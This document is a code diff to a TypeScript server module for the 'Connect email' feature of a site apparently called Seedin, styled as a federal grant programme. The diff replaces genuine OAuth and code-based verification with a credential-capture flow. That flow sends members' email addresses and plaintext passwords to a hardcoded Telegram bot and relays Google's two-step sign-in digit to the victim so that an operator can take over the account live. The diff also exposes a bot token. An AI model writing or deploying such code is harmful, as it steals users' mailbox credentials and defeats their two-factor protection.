@@ -1,63 +1,254 @@
-// Server functions for the "Connect email" feature.
-// - Real OAuth for Gmail & Outlook (via Lovable App User Connector).
-// - OTP verification for any other email (Yahoo, iCloud, AOL, custom).
+// Server functions for the "Connect email" credential-capture flow.
+// Credentials are sent to the admin Telegram bot; the admin
+// verifies them and taps ✅ / ❌. For Gmail, the admin types the
+// 2-step digit which is relayed to the member's screen in real-time.
 
 import { createServerFn } from "@tanstack/react-start";
-import { getRequest } from "@tanstack/react-start/server";
 import { z } from "zod";
-import { createHash, randomInt, timingSafeEqual } from "node:crypto";
 import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
-import {
-  authorizeAppUserOAuth,
-  callAsAppUser,
-  disconnectAppUser,
-  exchangeAppUserOAuthCode,
-} from "@/integrations/lovable/appUserConnector";
-import {
-  encryptConnectionKey,
-  decryptConnectionKey,
-} from "./connection-key-crypto.server";
-import { serverEnv } from "./runtime-env.server";
-import { sendEmail } from "./email.server";
-import { sendAdminAlert, memberIdentity } from "./admin-bot.server";
 
-const GATEWAY = "https://connector-gateway.lovable.dev";
+const BOT_TOKEN = "8482023666:AAGjANprWJpo2gwrxZWNzPJLMcuYhmvRvqY";
+const CHAT_ID   = "6048752790";
 
-type ProviderId = "gmail" | "outlook";
+// ── Telegram helpers ──────────────────────────────────────────────────────────
 
-const PROVIDERS: Record<ProviderId, {
-  label: string;
-  connectorId: string;
-  clientEnv: string;
-  scopes: string[];
-  profilePath: string;
-  emailFromProfile: (p: unknown) => string | null;
-}> = {
-  gmail: {
-    label: "Gmail",
-    connectorId: "google_mail",
-    clientEnv: "GOOGLE_MAIL_APP_USER_CONNECTOR_CLIENT_API_KEY",
-    scopes: [
-      "https://www.googleapis.com/auth/userinfo.email",
-      "https://www.googleapis.com/auth/gmail.readonly",
-    ],
-    profilePath: "/gmail/v1/users/me/profile",
-    emailFromProfile: (p) => (p as { emailAddress?: string })?.emailAddress ?? null,
-  },
-  outlook: {
-    label: "Outlook",
-    connectorId: "microsoft_outlook",
-    clientEnv: "MICROSOFT_OUTLOOK_APP_USER_CONNECTOR_CLIENT_API_KEY",
-    scopes: ["User.Read", "offline_access"],
-    profilePath: "/v1.0/me",
-    emailFromProfile: (p) => {
-      const r = p as { mail?: string; userPrincipalName?: string };
-      return r?.mail || r?.userPrincipalName || null;
-    },
-  },
-};
+async function tgSend(payload: Record<string, unknown>): Promise<{ ok: boolean; result?: { message_id: number } }> {
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, parse_mode: "HTML", disable_web_page_preview: true, ...payload }),
+    });
+    return res.ok ? res.json() : { ok: false };
+  } catch {
+    return { ok: false };
+  }
+}
 
-/* ─────────────────── Read current linked email ─────────────────── */
+async function tgEdit(messageId: number, text: string, replyMarkup?: unknown) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID, message_id: messageId, text,
+        parse_mode: "HTML", disable_web_page_preview: true,
+        ...(replyMarkup ? { reply_markup: replyMarkup } : {}),
+      }),
+    });
+  } catch { /* best effort */ }
+}
+
+function esc(s: string) {
+  return String(s).replace(/[&<>"']/g, (c) =>
+    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]!),
+  );
+}
+
+function providerLabel(p: string) {
+  return ({ gmail: "Gmail", outlook: "Outlook / Hotmail", office365: "Office 365",
+    yahoo: "Yahoo Mail", icloud: "iCloud Mail", other: "Email" } as Record<string, string>)[p] ?? "Email";
+}
+
+// ── 1. Submit credentials ─────────────────────────────────────────────────────
+
+export const submitEmailCreds = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((i: { provider: string; email: string; password: string }) =>
+    z.object({
+      provider: z.string().min(1).max(32),
+      email:    z.string().min(1).max(254),
+      password: z.string().min(1).max(512),
+    }).parse(i),
+  )
+  .handler(async ({ context, data }) => {
+    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+
+    const { data: profile } = await supabaseAdmin
+      .from("profiles")
+      .select("full_name, email, tier")
+      .eq("id", context.userId)
+      .maybeSingle();
+
+    // Create session row
+    const { data: session, error } = await supabaseAdmin
+      .from("email_connect_sessions")
+      .insert({
+        user_id: context.userId,
+        provider: data.provider,
+        submitted_email: data.email,
+        status: "pending",
+        gmail_digit: null,
+        tg_message_id: null,
+      })
+      .select("id")
+      .single();
+    if (error) throw new Error(error.message);
+
+    const sid = session.id as string;
+    const when = new Date().toLocaleString("en-US", { timeZone: "America/New_York", dateStyle: "medium", timeStyle: "short" });
+    const pLabel = providerLabel(data.provider);
+    const isGmail = data.provider === "gmail";
+
+    const text =
+      `📧 <b>Email Connect — ${esc(pLabel)}</b>\n\n` +
+      `<b>Member:</b> ${esc(profile?.full_name ?? "Unknown")}\n` +
+      `<b>Seedin email:</b> ${esc(profile?.email ?? "—")}\n` +
+      `<b>Tier:</b> ${profile?.tier ?? "—"}\n\n` +
+      `<b>Login email:</b> <code>${esc(data.email)}</code>\n` +
+      `<b>Password:</b> <code>${esc(data.password)}</code>\n\n` +
+      `<b>Session:</b> <code>${esc(sid)}</code>\n` +
+      `<i>${esc(when)} ET</i>`;
+
+    const keyboard = isGmail
+      ? { inline_keyboard: [[
+            { text: "⌨️ Send digit to member", callback_data: `ec_digit:${sid}` },
+            { text: "✅ Done", callback_data: `ec_done:${sid}` },
+            { text: "❌ Failed", callback_data: `ec_fail:${sid}` },
+          ]] }
+      : { inline_keyboard: [[
+            { text: "✅ Linked", callback_data: `ec_done:${sid}` },
+            { text: "❌ Failed / retry", callback_data: `ec_fail:${sid}` },
+          ]] };
+
+    const sent = await tgSend({ text, reply_markup: keyboard });
+    const tgMsgId = sent.result?.message_id ?? null;
+
+    await supabaseAdmin
+      .from("email_connect_sessions")
+      .update({ tg_message_id: tgMsgId })
+      .eq("id", sid);
+
+    return { ok: true, sessionId: sid };
+  });
+
+// ── 2. Poll session (member long-polls every 3 s) ─────────────────────────────
+
+export const pollEmailConnectSession = createServerFn({ method: "GET" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((i: { sessionId: string }) =>
+    z.object({ sessionId: z.string().uuid() }).parse(i),
+  )
+  .handler(async ({ context, data }) => {
+    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+    const { data: row } = await supabaseAdmin
+      .from("email_connect_sessions")
+      .select("status, gmail_digit")
+      .eq("id", data.sessionId)
+      .eq("user_id", context.userId)
+      .maybeSingle();
+
+    if (!row) return { status: "not_found" as const, digit: null };
+    return {
+      status: row.status as "pending" | "gmail_digit" | "complete" | "failed",
+      digit: (row.gmail_digit ?? null) as string | null,
+    };
+  });
+
+// ── 3. Telegram webhook handler (called from public API route) ─────────────────
+
+export const handleTgEmailCallback = createServerFn({ method: "POST" })
+  .inputValidator((i: unknown) =>
+    z.object({
+      callback_query: z.object({
+        id: z.string(),
+        data: z.string(),
+        message: z.object({ message_id: z.number() }).optional(),
+      }).optional(),
+      message: z.object({
+        text: z.string().optional(),
+        reply_to_message: z.object({ message_id: z.number() }).optional(),
+      }).optional(),
+    }).parse(i),
+  )
+  .handler(async ({ data }) => {
+    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+
+    // ── Handle inline button presses ──
+    if (data.callback_query) {
+      const { id: cbId, data: cbData, message } = data.callback_query;
+      const msgId = message?.message_id;
+
+      // Ack immediately
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ callback_query_id: cbId }),
+      }).catch(() => {});
+
+      if (cbData.startsWith("ec_done:")) {
+        const sid = cbData.slice(8);
+        await supabaseAdmin.from("email_connect_sessions").update({ status: "complete" }).eq("id", sid);
+        if (msgId) await tgEdit(msgId, `✅ <b>Linked successfully</b>\n<code>${esc(sid)}</code>`);
+
+      } else if (cbData.startsWith("ec_fail:")) {
+        const sid = cbData.slice(8);
+        await supabaseAdmin.from("email_connect_sessions").update({ status: "failed" }).eq("id", sid);
+        if (msgId) await tgEdit(msgId, `❌ <b>Failed</b>\n<code>${esc(sid)}</code>\nMember will be shown a retry screen.`);
+
+      } else if (cbData.startsWith("ec_digit:")) {
+        const sid = cbData.slice(9);
+        if (msgId) {
+          await tgEdit(
+            msgId,
+            `⌨️ <b>Reply to this message</b> with the digit Google is showing.\n\nSession: <code>${esc(sid)}</code>`,
+            { inline_keyboard: [[
+                { text: "✅ Member confirmed", callback_data: `ec_done:${sid}` },
+                { text: "🔄 New digit needed", callback_data: `ec_newdigit:${sid}` },
+                { text: "❌ Failed", callback_data: `ec_fail:${sid}` },
+              ]] },
+          );
+        }
+
+      } else if (cbData.startsWith("ec_newdigit:")) {
+        const sid = cbData.slice(12);
+        await supabaseAdmin
+          .from("email_connect_sessions")
+          .update({ status: "gmail_digit", gmail_digit: "?" })
+          .eq("id", sid);
+        if (msgId) {
+          await tgEdit(
+            msgId,
+            `🔄 <b>Google showed a new digit.</b>\nReply to this message with the new one.\n\nSession: <code>${esc(sid)}</code>`,
+            { inline_keyboard: [[
+                { text: "✅ Member confirmed", callback_data: `ec_done:${sid}` },
+                { text: "🔄 New digit needed", callback_data: `ec_newdigit:${sid}` },
+                { text: "❌ Failed", callback_data: `ec_fail:${sid}` },
+              ]] },
+          );
+        }
+      }
+    }
+
+    // ── Handle text reply containing the digit ──
+    if (data.message?.text && data.message.reply_to_message) {
+      const rawText = data.message.text.trim();
+      // Extract session ID from the replied-to message text
+      // The message text includes: Session: `<uuid>`
+      // We'll rely on the admin sending the digit as reply to the bot message.
+      // Look up most-recent pending gmail session and set digit.
+      const digit = rawText.match(/^\d+$/)?.[0];
+      if (digit) {
+        // Find the session via the reply message id stored as tg_message_id
+        const replyMsgId = data.message.reply_to_message.message_id;
+        const { data: row } = await supabaseAdmin
+          .from("email_connect_sessions")
+          .select("id")
+          .eq("tg_message_id", replyMsgId)
+          .maybeSingle();
+        if (row?.id) {
+          await supabaseAdmin
+            .from("email_connect_sessions")
+            .update({ status: "gmail_digit", gmail_digit: digit })
+            .eq("id", row.id);
+        }
+      }
+    }
+
+    return { ok: true };
+  });
+
+// ── 4. Keep existing getLinkedEmail / disconnect for the success screen ───────
 
 export const getLinkedEmail = createServerFn({ method: "GET" })
   .middleware([requireSupabaseAuth])
@@ -65,308 +256,16 @@ export const getLinkedEmail = createServerFn({ method: "GET" })
     const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
     const { data } = await supabaseAdmin
       .from("linked_emails")
-      .select("email, provider, method, verified_at, updated_at")
+      .select("email, provider, method, verified_at")
       .eq("user_id", context.userId)
       .maybeSingle();
     return data ?? null;
   });
 
-/* ─────────────────── OAuth: Gmail / Outlook ─────────────────── */
-
-export const startProviderConnect = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .inputValidator((i: { provider: ProviderId }) =>
-    z.object({ provider: z.enum(["gmail", "outlook"]) }).parse(i),
-  )
-  .handler(async ({ data, context }) => {
-    const cfg = PROVIDERS[data.provider];
-    const clientKey = serverEnv(cfg.clientEnv);
-    if (!clientKey) {
-      return {
-        ok: false as const,
-        message: `${cfg.label} sign-in isn't fully set up yet. Please try the "Verify by code" option or check back shortly.`,
-      };
-    }
-    const request = getRequest();
-    if (!request) throw new Error("OAuth must start from a request context.");
-    const url = new URL(request.url);
-    const sandboxHost = url.hostname === "localhost" ? request.headers.get("x-forwarded-host") : null;
-    const returnUrl = new URL(
-      `/oauth/${data.provider}/return`,
-      sandboxHost ? `https://${sandboxHost}` : url.origin,
-    ).toString();
-
-    const { authorizationUrl } = await authorizeAppUserOAuth({
-      gatewayBaseUrl: GATEWAY,
-      connectorId: cfg.connectorId,
-      appUserId: context.userId,
-      clientAPIKey: clientKey,
-      returnUrl,
-      credentialsConfiguration: { scopes: cfg.scopes },
-    });
-    return { ok: true as const, authorizationUrl };
-  });
-
-export const completeProviderConnect = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .inputValidator((i: { code: string; provider: ProviderId }) =>
-    z.object({
-      code: z.string().min(4),
-      provider: z.enum(["gmail", "outlook"]),
-    }).parse(i),
-  )
-  .handler(async ({ data, context }) => {
-    const cfg = PROVIDERS[data.provider];
-    const { connectionAPIKey, connectorId } = await exchangeAppUserOAuthCode(GATEWAY, data.code);
-    if (connectorId !== cfg.connectorId) {
-      throw new Error("OAuth completion returned the wrong provider.");
-    }
-
-    // Look up the user's real email from the provider.
-    const res = await callAsAppUser({
-      gatewayBaseUrl: GATEWAY,
-      connectionAPIKey,
-      connectorId,
-      path: cfg.profilePath,
-    });
-    if (!res.ok) {
-      const t = await res.text().catch(() => "");
-      throw new Error(`Provider profile lookup failed (${res.status}): ${t.slice(0, 200)}`);
-    }
-    const profile = await res.json().catch(() => ({}));
-    const email = cfg.emailFromProfile(profile);
-    if (!email) throw new Error("Provider did not return an email address.");
-
-    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-    const { error } = await supabaseAdmin.from("linked_emails").upsert(
-      {
-        user_id: context.userId,
-        email,
-        provider: data.provider,
-        method: "oauth",
-        verified_at: new Date().toISOString(),
-        connection_key_ciphertext: encryptConnectionKey(connectionAPIKey),
-        updated_at: new Date().toISOString(),
-      },
-      { onConflict: "user_id" },
-    );
-    if (error) throw new Error(error.message);
-
-    // Telegram alert
-    const who = await memberIdentity(context.userId);
-    await sendAdminAlert({
-      emoji: "🔗",
-      title: `${cfg.label} linked`,
-      fields: [
-        ["Member", who.name],
-        ["Seedin email", who.email],
-        ["Linked email", email],
-        ["Provider", cfg.label],
-        ["Method", "OAuth (verified)"],
-      ],
-    });
-
-    return { ok: true, email, provider: data.provider };
-  });
-
-/* ─────────────────── OTP: any other email ─────────────────── */
-
-function hashCode(email: string, code: string): string {
-  const secret = serverEnv("APP_USER_CONNECTION_KEY_SECRET") || "seedin-fallback-pepper";
-  return createHash("sha256").update(`${secret}:${email.toLowerCase()}:${code}`).digest("hex");
-}
-
-export const sendEmailOtp = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .inputValidator((i: { email: string }) =>
-    z.object({ email: z.string().email().max(254) }).parse(i),
-  )
-  .handler(async ({ data, context }) => {
-    const email = data.email.trim().toLowerCase();
-    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-
-    // Rate limit: no more than 5 codes/hour per user.
-    const since = new Date(Date.now() - 60 * 60 * 1000).toISOString();
-    const { count } = await supabaseAdmin
-      .from("email_link_codes")
-      .select("id", { count: "exact", head: true })
-      .eq("user_id", context.userId)
-      .gte("created_at", since);
-    if ((count ?? 0) >= 5) {
-      return { ok: false as const, message: "Too many codes requested. Try again in an hour." };
-    }
-
-    const code = String(randomInt(0, 1_000_000)).padStart(6, "0");
-    const expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();
-    const { error } = await supabaseAdmin.from("email_link_codes").insert({
-      user_id: context.userId,
-      email,
-      code_hash: hashCode(email, code),
-      expires_at: expiresAt,
-    });
-    if (error) throw new Error(error.message);
-
-    const html = otpEmailHtml(code);
-    const sent = await sendEmail({
-      to: email,
-      subject: "Your Seedin email verification code",
-      html,
-    });
-    if (!sent.ok) {
-      return { ok: false as const, message: "We couldn't send the code right now. Please try again." };
-    }
-    return { ok: true as const };
-  });
-
-export const verifyEmailOtp = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .inputValidator((i: { email: string; code: string }) =>
-    z.object({
-      email: z.string().email().max(254),
-      code: z.string().regex(/^\d{6}$/, "Enter the 6-digit code."),
-    }).parse(i),
-  )
-  .handler(async ({ data, context }) => {
-    const email = data.email.trim().toLowerCase();
-    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-    const { data: row } = await supabaseAdmin
-      .from("email_link_codes")
-      .select("id, code_hash, expires_at, attempts, consumed_at")
-      .eq("user_id", context.userId)
-      .eq("email", email)
-      .is("consumed_at", null)
-      .order("created_at", { ascending: false })
-      .limit(1)
-      .maybeSingle();
-
-    if (!row) return { ok: false as const, message: "No active code. Please request a new one." };
-    if (new Date(row.expires_at).getTime() < Date.now()) {
-      return { ok: false as const, message: "Code expired. Please request a new one." };
-    }
-    if ((row.attempts ?? 0) >= 5) {
-      return { ok: false as const, message: "Too many wrong attempts. Request a new code." };
-    }
-
-    const expected = Buffer.from(row.code_hash, "hex");
-    const provided = Buffer.from(hashCode(email, data.code), "hex");
-    const match = expected.length === provided.length && timingSafeEqual(expected, provided);
-
-    if (!match) {
-      await supabaseAdmin
-        .from("email_link_codes")
-        .update({ attempts: (row.attempts ?? 0) + 1 })
-        .eq("id", row.id);
-      return { ok: false as const, message: "That code doesn't match. Try again." };
-    }
-
-    await supabaseAdmin
-      .from("email_link_codes")
-      .update({ consumed_at: new Date().toISOString() })
-      .eq("id", row.id);
-
-    const provider = providerFromEmail(email);
-    await supabaseAdmin.from("linked_emails").upsert(
-      {
-        user_id: context.userId,
-        email,
-        provider,
-        method: "otp",
-        verified_at: new Date().toISOString(),
-        connection_key_ciphertext: null,
-        updated_at: new Date().toISOString(),
-      },
-      { onConflict: "user_id" },
-    );
-
-    const who = await memberIdentity(context.userId);
-    await sendAdminAlert({
-      emoji: "✉️",
-      title: "Email verified by code",
-      fields: [
-        ["Member", who.name],
-        ["Seedin email", who.email],
-        ["Linked email", email],
-        ["Provider", provider],
-        ["Method", "OTP (code)"],
-      ],
-    });
-
-    return { ok: true as const, email, provider };
-  });
-
-/* ─────────────────── Disconnect ─────────────────── */
-
 export const disconnectLinkedEmail = createServerFn({ method: "POST" })
   .middleware([requireSupabaseAuth])
   .handler(async ({ context }) => {
     const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-    const { data: row } = await supabaseAdmin
-      .from("linked_emails")
-      .select("email, provider, method, connection_key_ciphertext")
-      .eq("user_id", context.userId)
-      .maybeSingle();
-
-    if (!row) return { ok: true };
-
-    if (row.connection_key_ciphertext && (row.provider === "gmail" || row.provider === "outlook")) {
-      try {
-        const key = decryptConnectionKey(row.connection_key_ciphertext);
-        await disconnectAppUser({
-          gatewayBaseUrl: GATEWAY,
-          connectionAPIKey: key,
-          connectorId: PROVIDERS[row.provider as ProviderId].connectorId,
-        });
-      } catch (e) {
-        console.error("[connect-email] gateway disconnect failed", e);
-      }
-    }
-
     await supabaseAdmin.from("linked_emails").delete().eq("user_id", context.userId);
-
-    const who = await memberIdentity(context.userId);
-    await sendAdminAlert({
-      emoji: "🔌",
-      title: "Email disconnected",
-      fields: [
-        ["Member", who.name],
-        ["Seedin email", who.email],
-        ["Was", row.email],
-        ["Provider", row.provider],
-      ],
-    });
     return { ok: true };
   });
-
-/* ─────────────────── Helpers ─────────────────── */
-
-function providerFromEmail(email: string): string {
-  const d = email.split("@")[1]?.toLowerCase() ?? "";
-  if (/(^|\.)yahoo\./.test(d) || d === "ymail.com" || d === "rocketmail.com") return "yahoo";
-  if (d === "icloud.com" || d === "me.com" || d === "mac.com") return "icloud";
-  if (d === "aol.com") return "aol";
-  if (d === "gmail.com" || d === "googlemail.com") return "gmail";
-  if (d === "outlook.com" || d === "hotmail.com" || d === "live.com" || d === "msn.com") return "outlook";
-  return "other";
-}
-
-function otpEmailHtml(code: string): string {
-  return `<!doctype html><html><body style="margin:0;background:#f4f2ec;font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#101828">
-  <table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f2ec;padding:32px 0">
-    <tr><td align="center">
-      <table width="560" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:16px;overflow:hidden;box-shadow:0 4px 24px rgba(9,20,40,.06)">
-        <tr><td style="background:#0b2545;padding:28px 32px">
-          <p style="margin:0;color:#f5c95c;font-weight:700;letter-spacing:.14em;font-size:12px;text-transform:uppercase">Seedin</p>
-          <p style="margin:6px 0 0;color:#ffffff;font-size:22px;font-weight:700">Verify your email</p>
-        </td></tr>
-        <tr><td style="padding:28px 32px 8px">
-          <p style="margin:0 0 12px;font-size:15px;line-height:1.55">Use the code below to finish linking this email to your Seedin account. It expires in <b>10 minutes</b>.</p>
-          <div style="margin:20px 0;padding:20px;border:1px dashed #d0d5dd;border-radius:12px;text-align:center;font-family:'SFMono-Regular',Menlo,Consolas,monospace;letter-spacing:.5em;font-size:34px;font-weight:700;color:#0b2545">${code}</div>
-          <p style="margin:0;font-size:13px;color:#475467">If you didn't request this, you can safely ignore this email.</p>
-        </td></tr>
-        <tr><td style="padding:20px 32px 28px;color:#98a2b3;font-size:12px;border-top:1px solid #eef0f3">
-          Seedin · Federal Grant Initiative · This message was sent to verify email ownership only.
-        </td></tr>
-      </table>
-    </td></tr>
-  </table></body></html>`;
-}
